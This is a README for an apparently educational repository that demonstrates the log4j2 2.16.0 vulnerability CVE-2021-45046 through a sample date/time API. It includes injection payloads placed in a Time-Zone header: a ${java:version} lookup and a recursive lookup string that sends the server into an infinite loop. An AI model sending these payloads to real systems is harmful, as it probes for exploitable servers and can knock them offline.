## tejas-nagchandi/CVE-2021-45046

This repository contains the source code which can explain, how log4j2-core:2.16.0 can be exploited as per CVE-2021-45046.

## API description

Given source code returns the current date and time in differnt time-zones. (Default time-zone is UTC).

Users can change time-zone by setting the value of custom header `Time-Zone`

## Usage

`GET` request on `/currentDateTime` will give you current date and time in given (via header) or default time-zone with pattern `yyyy-mm-ddThh:mm:ss.sssssssss`

---
### Scenario 1
`GET` request on `/currentDateTime`

Output:

![image](https://user-images.githubusercontent.com/76960497/146695828-60c1f644-c9b6-4c94-8bdc-b29abf6264a7.png)

---
### Scenario 2
`GET` request on `/currentDateTime` with header `Time-Zone: GMT`

Output:

![image](https://user-images.githubusercontent.com/76960497/146695901-ae6ae82d-53a0-420b-942f-32ba0f183af4.png)

---
### Scenario 3
`GET` request on `/currentDateTime` with incorrect value in header `Time-Zone: AJKHSDHAJKSHD`

Output:

![image](https://user-images.githubusercontent.com/76960497/146695953-c8c0596a-4f98-4695-9492-bda2bf48a4f8.png)

Error logs:

```
01:12:58 [http-nio-8080-exec-10] | Time-Zone: AJKHSDHAJKSHD | Invalid timezone provided
```

---
### Attack scenario 1
`GET` request on `/currentDateTime` with incorrect value in header `Time-Zone: ${java:version}`

Output:

![image](https://user-images.githubusercontent.com/76960497/146696095-84dd8599-d84e-4e53-a069-38c49ddfcdae.png)

Error logs:

![image](https://user-images.githubusercontent.com/76960497/146696130-a6da35ed-83d5-48e1-b5b0-ce6e4db52bdc.png)

Above image proves that `${java:version}` is getting executed on server.

---
## Attack scenario 2
`GET` request on `/currentDateTime` with incorrect value in header `Time-Zone: ${${::-${::-$${::-$}}}}`

Output:

![image](https://user-images.githubusercontent.com/76960497/146696211-2752a5ac-b87d-4855-8435-75040ad6cb84.png)

Error logs:

![image](https://user-images.githubusercontent.com/76960497/146696236-3beec0c6-6e94-4455-a3d4-09f9d530d1eb.png)

Above image proves that `${${::-${::-$${::-$}}}}` is getting executed on server causing infinite loop.
